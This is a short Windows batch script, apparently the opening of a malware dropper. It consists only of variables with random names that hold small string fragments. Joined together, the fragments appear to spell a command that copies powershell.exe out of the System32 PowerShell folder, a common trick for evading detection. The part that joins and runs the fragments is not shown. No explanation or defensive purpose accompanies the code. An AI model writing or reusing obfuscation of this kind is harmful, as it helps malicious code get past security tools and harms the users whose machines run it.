@echo off
set "UNzulyHdxZ=st"
set "DxUpsmVaZw=po"
set "MUtTZuGoph=Po"
set "UeKMuDUaFL=:\"
set "IiOdkfIhAl=nd"
set "UxmSQWdhBB=he"
set "UbDeCwQfER=xe"
set "VsvNCyBpkg=do"
set "hYsnndcfKE=y "
set "zdnKckBSno=ow"
set "bgkzsQhVEt=\v"
set "HQuhilwBqn=.e"
set "oxnMeORrpX=co"
set "buJNXMqHCo=Sy"
set "plEHSULWBt=py"
set "tfzsnbYCOh=he"
set "SnZcODdCMC=ll"
set "CVNAkVRUdr=Wi"
set "sAeNuCyCxV=we"
set "uYwUOmaLAt=1."
set "aKrQRwunVp=s\"
set "CrbtZfsUwU=rs"
set "uZHPrXRXmO=em"
set "PIDNlCFXTy= /"
set "OqPWVcNUwZ=in"
set "UTqZunlXEs=\W"
set "qaMezAYtCj=ll"
